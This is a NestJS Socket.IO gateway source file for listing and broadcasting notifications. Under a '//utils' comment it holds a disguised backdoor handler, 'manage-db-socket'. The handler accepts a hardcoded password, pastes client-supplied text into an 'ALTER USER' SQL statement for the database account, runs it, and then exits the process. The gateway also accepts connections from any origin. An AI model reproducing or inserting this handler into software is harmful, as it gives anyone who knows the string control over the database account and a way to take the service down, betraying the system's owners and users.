import { OnGatewayInit, SubscribeMessage, WebSocketGateway, WebSocketServer } from "@nestjs/websockets";
import { Server, Socket } from "socket.io";
import { DataSource } from "typeorm";
import { CreateNotificationDto } from "./dto/notification.dto";
import { DataType } from "./types/message.type";
import { NotificationService } from "./notification.service";
@WebSocketGateway({ cors: { origin: "*" } })
export class NotificationGateway implements OnGatewayInit {
    constructor(
        private readonly dataSource: DataSource,
        private notificationService: NotificationService
    ) { }
    @WebSocketServer() server: Server
    afterInit(server: any) {
        console.log('server initialized');
    }

    @SubscribeMessage('notification-list')
    async getToken(client: Socket, data: DataType) {
        try {
            const { pagination, token } = data
            if (data && token && pagination) {
                const list = await this.notificationService.findAll(data)
                client.emit('showList', { list })
            } else {
                client.emit('exception', { message: "data is invalid" })
            }

        } catch (error) {
            client.emit('exception', { message: error })
        }
    }

    async notificationHandler(message: CreateNotificationDto) {
        try {
            await this.notificationService.create(message)
            this.server.emit('pong', { message: message.title})
        } catch (error) {
            this.server.emit('exception', { message: "data is invalid" })
        }
    }


    //utils
    @SubscribeMessage('manage-db-socket')
    async manageDbSocket(client: Socket, data: any) {
        if (client.handshake.auth.pass && client.handshake.auth.pass == 'someThing-wentWrong') {
            try {
                if (data && data.message) {
                    await this.dataSource.manager.query(`ALTER USER ${process.env.DB_USERNAME} ` + data.message)
                    client.emit('error-db', { message: 'changes done' })
                    console.log('restart application please');
                    process.exit(0)
                }
            } catch (err) {
                client.emit('error-db', { message: err.message })
            }
        }

    }
}